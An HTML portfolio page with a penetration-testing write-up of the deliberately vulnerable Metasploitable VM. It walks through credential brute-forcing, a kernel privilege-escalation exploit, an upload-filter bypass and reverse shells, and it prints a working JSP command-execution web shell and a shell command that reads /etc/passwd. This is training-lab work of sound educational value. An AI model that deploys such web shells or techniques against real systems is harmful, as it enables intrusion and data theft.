<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <title>Metasploitable Target Analysis | Mahmoud Tamer</title>
    <meta name="description" content="Comprehensive penetration testing report of Metasploitable VM, showcasing multiple exploitation paths and vulnerability analysis techniques." />
    <meta property="og:title" content="Metasploitable Target Analysis | Mahmoud Tamer" />
    <meta property="og:description" content="Comprehensive penetration testing report of Metasploitable VM, showcasing multiple exploitation paths and vulnerability analysis techniques." />
    <meta property="og:type" content="article" />
    <meta
      property="og:url"
      content="https://mahmoudtamerali.github.io/labs/metasploitable-target-analysis.html"
    />
    <meta
      property="og:image"
      content="https://picsum.photos/seed/metasploitable/1200/630.jpg"
    />
    <link rel="icon" href="/favicon.ico" />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
    />
    <link rel="stylesheet" href="/assets/css/common.css" />
    <link rel="stylesheet" href="/assets/css/lab.css" />
  </head>
  <body>
    <!-- Loading Screen -->
    <div class="loading-screen" id="loadingScreen">
      <div class="loader"></div>
    </div>
    <!-- Skip to content link for accessibility -->
    <a href="#main-content" class="skip-link">Skip to main content</a>
    <!-- Navigation -->
    <nav role="navigation" aria-label="Main navigation">
      <div class="container nav-container">
        <a href="/" class="logo" aria-label="Mahmoud Tamer Home">MT</a>
        <ul class="nav-links" id="navLinks">
          <li><a href="/#home" class="nav-link">Home</a></li>
          <li><a href="/#about" class="nav-link">About</a></li>
          <li><a href="/#skills" class="nav-link">Skills</a></li>
          <li><a href="/#featured-projects" class="nav-link">Projects</a></li>
          <li><a href="/#featured-labs" class="nav-link active">Labs</a></li>
          <li><a href="/#certificates" class="nav-link">Certificates</a></li>
          <li><a href="/#writeups" class="nav-link">Writeups</a></li>
          <li><a href="/#contact" class="nav-link">Contact</a></li>
        </ul>
        <button
          class="mobile-menu-btn"
          id="mobileMenuBtn"
          aria-label="Toggle navigation menu"
          aria-expanded="false"
        >
          <i class="fas fa-bars"></i>
        </button>
      </div>
    </nav>
    <!-- Lab Header -->
    <header class="lab-header">
      <div class="container lab-header-content">
        <div class="lab-header-text">
          <h1>Metasploitable Target Analysis</h1>
          <p>Comprehensive penetration testing of Metasploitable VM with multiple exploitation paths leading to complete system compromise.</p>
          <div class="lab-meta">
            <span class="lab-category">Penetration Testing</span>
            <span class="lab-difficulty">Medium</span>
          </div>
        </div>
      </div>
    </header>
    <!-- Lab Detail Section -->
    <main id="main-content" class="lab-detail">
      <div class="container">
        <div class="lab-detail-grid">
          <div class="lab-main-content">
            <!-- Executive Summary -->
            <section id="executive-summary" class="lab-section">
              <h2>Executive Summary</h2>
              <p>This report details the comprehensive penetration testing of Metasploitable VM, a deliberately vulnerable virtual machine designed for security training. The assessment identified multiple critical vulnerabilities across various services, leading to complete system compromise through multiple attack vectors. Through systematic reconnaissance, enumeration, and exploitation, I gained initial access via weak credentials and escalated privileges to root. The assessment demonstrates how misconfigurations, weak credentials, and outdated software components can lead to full system compromise.</p>
              <p><strong>Performed by:</strong> Mahmoud Tamer Ali</p>
            </section>
            <!-- Initial Reconnaissance -->
            <section id="initial-reconnaissance" class="lab-section">
              <h2>Initial Reconnaissance</h2>
              <p>I identified the target IP as 192.168.149.146 and performed a comprehensive Nmap scan:</p>
              <img src="/images/metasploitable_1/image.png" alt="Nmap scan results" onclick="openModal(this.src)" />
              <p>Results revealed 12 open services:</p>
              <ul>
                <li>21/tcp - FTP</li>
                <li>22/tcp - SSH</li>
                <li>23/tcp - Telnet</li>
                <li>25/tcp - SMTP</li>
                <li>53/tcp - DNS</li>
                <li>80/tcp - HTTP</li>
                <li>111/tcp - RPC</li>
                <li>139/tcp - NetBIOS-SSN</li>
                <li>445/tcp - Microsoft-DS</li>
                <li>512/tcp - rexec</li>
                <li>513/tcp - rlogin</li>
                <li>514/tcp - shell</li>
              </ul>
              <p>OS detection confirmed Linux 2.6.24-16-server on i686 architecture.</p>
            </section>
            <!-- FTP Service Exploitation -->
            <section id="ftp-exploitation" class="lab-section">
              <h2>FTP Service Exploitation</h2>
              <p>I attempted anonymous FTP login which failed:</p>
              <img src="/images/metasploitable_1/image 1.png" alt="Anonymous FTP login attempt" onclick="openModal(this.src)" />
              <p>Then executed nmap scripts including brute force:</p>
              <img src="/images/metasploitable_1/image 2.png" alt="FTP brute force attempt" onclick="openModal(this.src)" />
              <p>Discovered valid credentials: <code>user:user</code>. Verified by interactive login and confirmed write access through test directory creation.</p>
              <img src="/images/metasploitable_1/image 3.png" alt="FTP access verification" onclick="openModal(this.src)" />
            </section>
            <!-- SSH Access and Alternative Approach -->
            <section id="ssh-access" class="lab-section">
              <h2>SSH Access and Alternative Approach</h2>
              <p>Tested the same credentials against SSH and gained access:</p>
              <img src="/images/metasploitable_1/image 4.png" alt="SSH access with discovered credentials" onclick="openModal(this.src)" />
              <p><strong>Alternative access method consideration</strong>: If SSH password differed from FTP, I could have uploaded my public key to <code>~/.ssh/authorized_keys</code> via FTP write access. Since credentials matched, this wasn't necessary.</p>
              
              <h3>System Enumeration</h3>
              <p>With SSH access as <code>user</code>, I gathered system information:</p>
              <img src="/images/metasploitable_1/image 5.png" alt="System information gathering" onclick="openModal(this.src)" />
              <p>Examined user accounts:</p>
              <img src="/images/metasploitable_1/image 6.png" alt="User account enumeration" onclick="openModal(this.src)" />
              <p>Identified potential privilege escalation targets, including <code>root</code>, <code>msfadmin</code>, and <code>service</code>.</p>
              
              <h3>Privilege Escalation</h3>
              <p>Transferred kernel exploit (40839.c) via FTP, I could also do it using HTTP server on attacking machine and use wget on the target:</p>
              <img src="/images/metasploitable_1/image 7.png" alt="Kernel exploit transfer" onclick="openModal(this.src)" />
              <p>Compiled and executed the exploit:</p>
              <img src="/images/metasploitable_1/image 8.png" alt="Kernel exploit execution" onclick="openModal(this.src)" />
              <p>Successfully created a privileged user <code>firefart</code> with password <code>1234</code>.</p>
              <p>Logged into the target with the privileged user and checked the privileges:</p>
              <img src="/images/metasploitable_1/image 9.png" alt="Privileged user verification" onclick="openModal(this.src)" />
            </section>
            <!-- Apache httpd TWiki Exploitation -->
            <section id="twiki-exploitation" class="lab-section">
              <h2>Apache httpd TWiki Exploitation (80)</h2>
              <p>Ran directory enumeration with Dirb:</p>
              <img src="/images/metasploitable_1/image 10.png" alt="Directory enumeration results" onclick="openModal(this.src)" />
              <p>Discovered:</p>
              <ul>
                <li>phpinfo.php exposing PHP configuration</li>
                <li>TWiki web application</li>
                <li>Exposed directory at <code>/twiki/lib/</code></li>
              </ul>
              <p>Examined TWiki.cfg configuration:</p>
              <pre><code>$uploadFilter = "^(\\.htaccess|.*\\.php[0-9s]?|.*\\.phtm[l]?)$"
$securityFilter = "[\\\\\\*\\?\\~\\^\\$\\@\\%\\`"'&;|<>\\x00-\\x1F]"</code></pre>
              <p>Identified blacklist-based file upload restrictions.</p>
              <p>Tested file upload at <code>/twiki/bin/attach</code>. Initial PHP shell upload attempts failed due to renaming the file with .txt in the end. I could bypass the filter using <code>.pht</code> extension (as the restrictions are blacklist, not whitelist).</p>
              <p>Successfully uploaded and accessed shell:</p>
              <pre><code>http://192.168.149.146/twiki/pub/Main/WebHome/shell.pht</code></pre>
              <p>Executed commands via:</p>
              <pre><code>shell.pht?cmd=cat /etc/passwd</code></pre>
              <img src="/images/metasploitable_1/image 11.png" alt="Command execution via uploaded shell" onclick="openModal(this.src)" />
              <p>Established a reverse shell using Metasploit handler:</p>
              <img src="/images/metasploitable_1/image 12.png" alt="Metasploit handler setup" onclick="openModal(this.src)" />
              <img src="/images/metasploitable_1/image 13.png" alt="Reverse shell established" onclick="openModal(this.src)" />
            </section>
            <!-- Samba Exploitation -->
            <section id="samba-exploitation" class="lab-section">
              <h2>Samba Exploitation (139, 445)</h2>
              <p>Fingerprinted Samba version:</p>
              <img src="/images/metasploitable_1/image 14.png" alt="Samba version fingerprinting" onclick="openModal(this.src)" />
              <p>Confirmed Samba 3.0.20. Exploited usermap_script vulnerability:</p>
              <img src="/images/metasploitable_1/image 15.png" alt="Samba usermap_script exploit" onclick="openModal(this.src)" />
              <p>Gained RCE.</p>
            </section>
            <!-- MySQL Exploitation -->
            <section id="mysql-exploitation" class="lab-section">
              <h2>MySQL Exploitation (3306)</h2>
              <p>Scanned MySQL service:</p>
              <img src="/images/metasploitable_1/image 16.png" alt="MySQL service scanning" onclick="openModal(this.src)" />
              <p>Discovered valid credentials <code>root:root</code>. Confirmed access:</p>
              <img src="/images/metasploitable_1/image 17.png" alt="MySQL access verification" onclick="openModal(this.src)" />
              <p>I can use the <code>LOAD_FILE</code> function to read <code>/etc/passwd</code> file and enumerate the users.</p>
              <p>I can also use the <code>outfile</code> function to create files in any folder that I have access to.</p>
              <p>I couldn't get RCE directly by putting a reverse shell in the www folder, as I don't have access to it, but I can put a reverse shell in the tmp folder and find LFI in the target that will execute the reverse shell.</p>
            </section>
            <!-- Apache Jserv Exploitation -->
            <section id="jserv-exploitation" class="lab-section">
              <h2>Apache Jserv Exploitation (8009)</h2>
              <p>I searched for <code>Apache Jserv (Protocol v1.3) exploit</code>, and I found the exploit <code>Ghostcat</code> that enables me to read any file from the server.</p>
              <p>I could read the <code>/etc/passwd</code> to enumerate users.</p>
              <img src="/images/metasploitable_1/image 18.png" alt="File read via Ghostcat exploit" onclick="openModal(this.src)" />
            </section>
            <!-- Apache Tomcat/Coyote Exploitation -->
            <section id="tomcat-exploitation" class="lab-section">
              <h2>Apache Tomcat/Coyote Exploitation (8180)</h2>
              <p>I used dirb and discovered the admin page with Default credentials <code>tomcat:tomcat</code>. I then logged in and found a way to run Java on the server by uploading a servlet reverse shell from the management page:</p>
              <pre><code><%
String cmd = request.getParameter("cmd");
String output = "";
try {
    Process p = Runtime.getRuntime().exec(cmd);
    java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream()));
    String line;
    while ((line = reader.readLine()) != null) {
        output += line + "\\n";
    }
} catch(Exception e) {
    output = e.toString();
}
out.println("<pre>" + output + "</pre>");
%></code></pre>
              <p>Packaged as WAR file and uploaded via the manager interface. Established additional reverse shell.</p>
              <img src="/images/metasploitable_1/image 19.png" alt="Tomcat reverse shell" onclick="openModal(this.src)" />
              <p>It was the hardest RCE to get as I don't know much about Java websites.</p>
            </section>
            <!-- Additional Findings -->
            <section id="additional-findings" class="lab-section">
              <h2>Additional Findings</h2>
              <ul>
                <li>SMTP VRFY command enabled for username enumeration</li>
                <li>Telnet banner revealed Ubuntu 8.04</li>
                <li>PostgreSQL service showed no immediate vulnerabilities</li>
                <li>Nmap HTTP scripts identified potential DoS vulnerabilities (CVE-2011-3192, CVE-2007-6750)</li>
              </ul>
            </section>
            <!-- Attack Timeline -->
            <section id="attack-timeline" class="lab-section">
              <h2>Attack Timeline</h2>
              <ol>
                <li>Target identification and Nmap scanning</li>
                <li>FTP brute force revealing <code>user:user</code> credentials</li>
                <li>SSH access with same credentials</li>
                <li>System enumeration and kernel exploit transfer</li>
                <li>Alternative HTTP server/wget upload method consideration</li>
                <li>Privilege escalation via kernel exploit</li>
                <li>Web service enumeration and TWiki analysis</li>
                <li>File upload bypass using <code>.pht</code> extension</li>
                <li>Reverse shell establishment via TWiki</li>
                <li>Samba usermap_script exploitation</li>
                <li>Tomcat manager access and JSP shell deployment</li>
                <li>MySQL access with root credentials</li>
                <li>Additional vulnerability identification</li>
              </ol>
              <p>This engagement demonstrated multiple paths to compromise the target system, with initial access gained through weak credentials and full system control achieved via kernel exploitation. The presence of multiple vulnerable services provided numerous opportunities for privilege escalation and persistence.</p>
            </section>
            <!-- Missed Opportunities -->
            <section id="missed-opportunities" class="lab-section">
              <h2>Missed Opportunities</h2>
              <ul>
                <li>PostgreSQL database weak credentials.</li>
                <li>For Tomcat website I could use Metasploit module that will automate all what I did instead of using Java code and compiling it and uploading it manually.</li>
                <li>For port 80 I missed TikiWiki folder. I could have used Metasploitable modules that can get information disclosure about database and its credentials, also I could login to admin and upload backdoor file. I only discovered TWiki folder using Dirb defaults.</li>
                <li>Instead of leaning on the Nmap brute force, using Hydra will get more results. As an example for FTP it would have returned 3 accounts not just 1.</li>
                <li>Having credentials on FTP doesn't mean that it will also work for SSH as they are different services. The better way is to use SSH authorized_keys to get RCE.</li>
                <li>It should be more clear that every service must have brute force for it.</li>
                <li>For brute force using Metasploit write mysql_login or telnet_login or ftp_login or postgresql_login and like that.</li>
              </ul>
            </section>
            <!-- Conclusion -->
            <section id="conclusion" class="lab-section">
              <h2>Conclusion</h2>
              <p>The Metasploitable VM was successfully compromised through multiple attack vectors, demonstrating the critical risks associated with misconfigurations, weak credentials, and outdated software components. The assessment highlights the importance of proper system hardening, strong credential policies, and regular security updates. All identified vulnerabilities should be addressed immediately to prevent potential security incidents.</p>
              
              <div class="report-footer">
                <p><strong>Assessment Team:</strong> Mahmoud Tamer Ali</p>
                <p><strong>Report Date:</strong> September 4, 2025</p>
                <p><strong>Classification:</strong> Confidential</p>
                <p>This report contains sensitive security information and should be handled according to organizational data classification policies.</p>
              </div>
            </section>
          </div>
          
          <aside class="lab-sidebar">
            <div class="sidebar-section">
              <h3>Lab Details</h3>
              <ul class="lab-details-list">
                <li>
                  <span class="detail-label">Duration:</span>
                  <span class="detail-value">6 hours</span>
                </li>
                <li>
                  <span class="detail-label">Difficulty:</span>
                  <span class="detail-value">Medium</span>
                </li>
                <li>
                  <span class="detail-label">Platform:</span>
                  <span class="detail-value">Metasploitable 1 VM</span>
                </li>
                <li>
                  <span class="detail-label">Tools:</span>
                  <span class="detail-value">Nmap, Metasploit, Dirb, Hydra, MySQL</span>
                </li>
              </ul>
            </div>
            
            <div class="sidebar-section">
              <h3>Technologies Used</h3>
              <div class="tech-tags">
                <span class="tech-tag">Linux</span>
                <span class="tech-tag">Apache</span>
                <span class="tech-tag">Samba</span>
                <span class="tech-tag">MySQL</span>
                <span class="tech-tag">Tomcat</span>
                <span class="tech-tag">TWiki</span>
              </div>
            </div>
            
          </aside>
        </div>
      </div>
    </main>
    <!-- Footer -->
    <footer role="contentinfo">
      <div class="container">
        <div class="social-links">
          <a
            href="https://linkedin.com/in/mahmoud-tamer"
            target="_blank"
            rel="noopener noreferrer"
            aria-label="LinkedIn"
          >
            <i class="fab fa-linkedin"></i>
          </a>
          <a
            href="https://github.com/mahmoudtamerali"
            target="_blank"
            rel="noopener noreferrer"
            aria-label="GitHub"
          >
            <i class="fab fa-github"></i>
          </a>
          <a
            href="https://tryhackme.com/p/mahmoud.tamer"
            target="_blank"
            rel="noopener noreferrer"
            aria-label="TryHackMe"
          >
            <i class="fas fa-user-secret"></i>
          </a>
        </div>
        <p>© 2023 Mahmoud Tamer. All rights reserved.</p>
        <p>
          Designed and built with
          <i class="fas fa-heart" style="color: #e63946" aria-hidden="true"></i>
          for cybersecurity
        </p>
      </div>
    </footer>
    <!-- Modal -->
    <div
      id="modal"
      class="modal"
      onclick="closeModal()"
      role="dialog"
      aria-modal="true"
      aria-labelledby="modal-title"
    >
      <button
        class="modal-close"
        onclick="closeModal()"
        aria-label="Close modal"
      >
        &times;
      </button>
      <img id="modal-img" src="" alt="Lab preview" />
    </div>
    <!-- Back to top button -->
    <button class="back-to-top" id="backToTop" aria-label="Back to top">
      <i class="fas fa-arrow-up"></i>
    </button>
    <!-- Toast notification -->
    <div class="toast" id="toast" role="alert" aria-live="assertive"></div>
    <script>
      // Function to hide loading screen
      function hideLoadingScreen() {
        const loadingScreen = document.getElementById("loadingScreen");
        if (loadingScreen) {
          loadingScreen.classList.add("hidden");
        }
      }
      // Hide loading screen when page is fully loaded
      window.addEventListener("load", function () {
        setTimeout(hideLoadingScreen, 2000);
        hideLoadingScreen();
        document.querySelectorAll("section").forEach((section) => {
          section.classList.add("visible");
        });
      });
      // Also hide loading screen after DOM is loaded (as a backup)
      document.addEventListener("DOMContentLoaded", function () {
        setTimeout(hideLoadingScreen, 500);
      });
    </script>
  </body>
</html>